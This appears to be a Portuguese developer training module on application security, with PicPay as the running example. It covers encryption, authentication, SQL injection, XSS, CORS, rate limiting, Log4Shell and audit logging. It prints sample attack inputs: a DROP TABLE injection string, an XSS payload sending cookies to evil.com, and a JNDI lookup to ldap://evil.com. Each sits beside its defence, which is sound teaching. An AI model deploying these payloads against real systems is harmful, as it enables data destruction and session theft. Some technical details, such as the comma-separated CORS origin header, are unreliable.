Segurança

Semana 4 — Protegendo dados e evitando os ataques mais comuns

1 Princípios Fundamentais de Segurança

Segurança não é um add-on. É parte do design desde o começo. Existem três pilares principais:

  • Confidencialidade — Dados sensíveis não podem ser lidos por pessoas não autorizadas.
  • Integridade — Dados não podem ser alterados sem autorização.
  • Disponibilidade — O sistema deve estar sempre acessível (sem DDoS, sem crashes).

🔒 Analogia: Confidencialidade = fechadura na porta de casa (privacidade). Integridade = sensor de movimento que te avisa se alguém entrou. Disponibilidade = a porta não pode ficar travada permanentemente.

Princípio de Least Privilege: cada usuário, aplicação ou serviço tem apenas as permissões que precisa. Nada de admin pra tudo.

Defense in Depth: não confie em uma única camada de proteção. Use múltiplas camadas:

Firewall → WAF → API Gateway → Autenticação → Autorização → Validação

💡 No PicPay... todos os sistemas têm acesso mínimo necessário. Um microserviço de wallets não precisa acessar o banco de dados do cartão — chamam uma API. Se um serviço for comprometido, o dano fica limitado.

2 Criptografia

Criptografia transforma dados legíveis em dados ilegíveis sem uma "chave" pra desbloquear.

Dois tipos principais:

  • Simétrica — Mesma chave pra criptografar e descriptografar. Rápida, mas como compartilha a chave?
  • Assimétrica — Duas chaves: pública (compartilhada) e privada (secreta). Mais lenta, mas segura pra compartilhar.

Criptografia em repouso (at-rest): dados armazenados no disco são criptografados.

SELECT * FROM usuarios  
-- O Postgres criptografa automaticamente no disco
-- Se alguém roubar o disco, não consegue ler os dados

Criptografia em trânsito (in-transit): dados viajando pela rede são criptografados (HTTPS/TLS).

Hash (não é criptografia): transforma dados em uma sequência irreversível. Ideal pra senhas.

senha = "minhaSenh@123"
hash = SHA-256(senha) = "a7f3e4b2d1c9f8a0..."
-- Guardamos o hash. Usuário entra, hasheia a entrada e compara.

Nunca, nunca, NUNCA armazene senhas em plain text. Sempre use hash + salt (valor aleatório adicionado).

💡 No PicPay... senhas são hashadas com bcrypt (ou similar). Dados sensíveis em repouso são criptografados com KMS (Key Management Service) da AWS. Toda comunicação entre serviços usa TLS. Se alguém capturar o tráfego, vê só gibberish.

3 Autenticação vs Autorização

Autenticação: provar quem você é. "Você é o João?" Autorização: o que você pode fazer. "João, você pode ver relatórios de vendas?"

🎟️ Analogia: Autenticação = mostrar seu documento no shows. Autorização = a pulseira de acesso ao camarim.

Métodos de autenticação:

  • Usuário + Senha — Clássico. Rápido, mas inseguro (force brute, phishing).
  • OAuth 2.0 / OpenID Connect — Delega autenticação pra um provedor (Google, GitHub). Mais seguro.
  • JWT (JSON Web Token) — Token que contém claims (dados). Stateless — servidor não precisa guardar sessão.
  • MFA (Multi-Factor Authentication) — Algo que você sabe (senha) + algo que você tem (telefone). Muito mais seguro.

JWT na prática:

// Após login bem-sucedido, servidor emite:
token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  (header) . (payload: user_id, permissions, exp) . (signature)

// Cliente manda em cada requisição:
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

// Servidor valida: a assinatura é válida? O token expirou?

💡 No PicPay... usamos JWT pra APIs internas e OAuth 2.0 pra apps mobile/web. Todo acesso exige autenticação. Autorização é baseada em roles (você é "support", "analyst", "admin") — cada role tem permissões pré-definidas.

5 SQL Injection e Prevenção

SQL Injection: o desenvolvedor concatena input do usuário diretamente na query.

Exemplo VULNERÁVEL:

// ❌ PERIGO!
email = request.getParameter("email")  // "'; DROP TABLE usuarios; --"
query = "SELECT * FROM usuarios WHERE email = '" + email + "'"
// Query fica: SELECT * FROM usuarios WHERE email = ''; DROP TABLE usuarios; --'
// Resultado: tabela inteira deletada!

Solução — Prepared Statements (Parameterized Queries):

// ✅ SEGURO!
email = request.getParameter("email")
query = "SELECT * FROM usuarios WHERE email = ?"
result = db.execute(query, [email])  // Email é tratado como valor, não código

O banco entende: "? é um valor", não "? é SQL". Mesmo se o email for "'; DROP TABLE; --", é tratado como string literal.

Regra de ouro: nunca concatene input do usuário em queries SQL. Sempre use prepared statements ou ORMs (como Hibernate, Sequelize) que fazem isso pra você.

💡 No PicPay... 100% das queries usam prepared statements ou ORM. Code review automatizado procura por SQL concatenação e bloqueia. Testes de segurança injetam SQL malicioso pra confirmar que não há vulnerabilidade.

6 XSS (Cross-Site Scripting)

XSS: injetar JavaScript malicioso que rodar no navegador do usuário.

Exemplo VULNERÁVEL — Stored XSS:

// Usuário 1 comenta:
comment = "<img src=x onerror='fetch(\"https://evil.com/steal?c=\"+document.cookie)'"
db.save(comment)  // Salva sem sanitizar

// Usuário 2 vê o comentário:
// HTML renderizado: <img src=x onerror="...steal cookie...">
// Navegador executa o JavaScript
// Cookie do Usuário 2 é enviado pra attacker!

Solução — Escape / Sanitização:

// ✅ SEGURO!
comment = "<img src=x onerror='fetch(\"https://evil.com/steal?c=\"+document.cookie)'"
escaped = htmlEscape(comment)
// Fica: "&lt;img src=x onerror=..."
// Navegador renderiza como TEXTO, não como HTML

Tipos de XSS:

  • Stored — Malicioso armazenado no banco, afeta todos que o veem.
  • Reflected — Malicioso vem da URL, retorna direto ao navegador ("clique nesse link")
  • DOM-based — JavaScript malicioso manipula o DOM direto, sem ir pelo servidor.

💡 No PicPay... todo input do usuário é escapado antes de ser renderizado em HTML. Frameworks modernas (React, Vue) fazem isso por padrão. O WAF bloqueia requisições com payload XSS conhecidas.

7 CORS — Compartilhamento de Recursos

CORS (Cross-Origin Resource Sharing) controla quem pode fazer requisições pra sua API.

Sem CORS, uma página em evil.com não conseguiria fazer uma requisição pra sua API em picpay.com. É uma proteção do navegador (Same-Origin Policy).

CORS misconfigured:

// ❌ PERIGO: Allow ANY origem
Access-Control-Allow-Origin: *

// Agora qualquer site pode fazer requisições e acessar dados!

CORS correto:

// ✅ SEGURO: Allow só origins específicas
Access-Control-Allow-Origin: https://app.picpay.com, https://wallet.picpay.com

// Só essas duas URLs conseguem fazer requisições

💡 No PicPay... CORS é configurado pra whitelist de domínios (app.picpay.com, wallet.picpay.com, etc). APIs internas não usam CORS — rodamna mesma VPC. Apenas APIs públicas têm CORS configurado.

8 Rate Limiting e Brute Force

Rate Limiting: limitar quantas requisições um IP/usuário pode fazer em um período.

Sem rate limit:

// Attacker tenta 1 milhão de senhas em 1 minuto
for i in range(1000000):
  POST /login { email: "user@example.com", password: brute_force_dict[i] }
// Uma vai acertar!

Com rate limit (ex: 5 tentativas por 15 min):

tentativas[ip] = 3
if tentativas[ip] > 5:
  bloqueia IP por 15 minutos
// Attacker consegue só 5 tentativas, depois tá bloqueado

Outras proteções contra brute force:

  • Exponential backoff — Cada falha aumenta o tempo de espera (1s, 2s, 4s, 8s...)
  • CAPTCHA — Após N falhas, exige resolver um desafio
  • MFA — Mesmo acertando a senha, precisa do telefone/app autenticador
  • Account Lockout — Após N falhas, bloqueia a conta por X minutos

💡 No PicPay... login tem rate limit de 5 tentativas por 15 min por IP. Após isso, bloqueia. MFA é obrigatório pra qualquer acesso. Tentativas de brute force são logadas — o time de segurança monitora.

9 Dependency Vulnerabilities — CVEs

Você usa bibliotecas de terceiros. Se tiverem bugs de segurança (CVEs), você herda o problema.

Exemplo real:

// Seu projeto usa:
dependencies: [
  "log4j 2.14.1"  // CVE-2021-44228: RCE (Remote Code Execution!)
]

// Attacker envia uma log message:
LOG.info("${jndi:ldap://evil.com/a}")
// log4j executa código remoto!

Como se proteger:

  • Scanning automático — Ferramentas como npm audit, snyk, owasp-dependency-check ficam monitorando.
  • Pinning de versões — Usar versão exata, não `^1.2.3` (que atualiza minor).
  • Regular updates — Atualizar dependências regularmente (mas testar!).
  • Retire de dependência — Se um lib morreu de suporte, remove ou substitui.

💡 No PicPay... todo PR passa por scanning de dependências. Se tiver CVE, o CI bloqueia o merge. Dependências são atualizadas via renovate bot (automatizado, com testes). Zero-day é monitorado 24/7.

10 Audit Logging — Rastreamento de Ações

Auditoria é a capacidade de rastrear quem fez o quê, quando, onde e por quê.

O que registrar?

  • Logins (sucesso e falha)
  • Alterações de permissões
  • Operações críticas (deletar, transferir dinheiro)
  • Acesso a dados sensíveis
  • Mudanças de senha, MFA, recovery codes
  • Acessos via API (quem, endpoint, parâmetros)

Exemplo de audit log:

{
  timestamp: "2024-01-15 10:30:00 UTC",
  user_id: 12345,
  action: "transfer_money",
  from_account: 98765,
  to_account: 54321,
  amount: 1000.00,
  status: "success",
  ip_address: "192.168.1.1",
  user_agent: "Chrome 120"
}

Logs devem ser imutáveis — não podem ser alterados depois de criados. Armazenar em local seguro, com retenção por lei (ex: 5 anos pra dados financeiros).

💡 No PicPay... tudo é auditado: logins, transações, mudanças de rota no Kong, deploys em produção. Logs vão pra um sistema centralizado (ELK Stack, Splunk, Datadog). Compliance exige manter 5+ anos. Qualquer ação crítica gera alerta em tempo real.
